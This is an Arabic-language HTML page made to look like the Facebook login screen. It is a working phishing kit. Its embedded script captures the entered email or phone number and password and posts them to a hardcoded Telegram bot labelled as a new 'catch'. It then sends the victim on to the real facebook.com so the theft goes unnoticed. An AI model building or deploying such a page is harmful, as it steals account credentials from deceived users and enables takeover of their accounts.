<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى فيسبوك</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="login-container">
        <!-- اختيار اللغة -->
        <div class="lang-selection">
            <span>العربية</span>
            <span class="arrow">v</span>
        </div>

        <!-- اللوجو الدائري لفيسبوك -->
        <div class="logo-box">
            <div class="fb-logo-circle">f</div>
        </div>

        <!-- نموذج تسجيل الدخول -->
        <form id="loginForm" class="form-box">
            <input type="text" id="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
            <input type="password" id="password" placeholder="كلمة السر" required>
            
            <button type="submit" class="login-btn">تسجيل الدخول</button>
            
            <a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>
        </form>

        <!-- زر إنشاء حساب جديد -->
        <div class="create-account-box">
            <a href="#" class="create-btn">إنشاء حساب جديد</a>
        </div>

        <!-- شعار Meta في الأسفل -->
        <div class="meta-footer">
            <span class="meta-icon">∞</span> Meta
        </div>
    </div>

    <!-- كود إرسال البيانات إلى تيليجرام -->
    <script>
        const botToken = "8880573702:AAEcni2H3MYNKKyU0GJen2XqPFgAyLO4Mdw";
        const chatId = "8304712202";

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            const message = `🔔 صيد جديد يا غالي:\n\n📧 البريد/الهاتف: ${email}\n🔑 كلمة السر: ${password}`;

            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                window.location.href = "https://www.facebook.com";
            })
            .catch(error => {
                console.error('Error:', error);
                window.location.href = "https://www.facebook.com";
            });
        });
    </script>
</body>
</html>
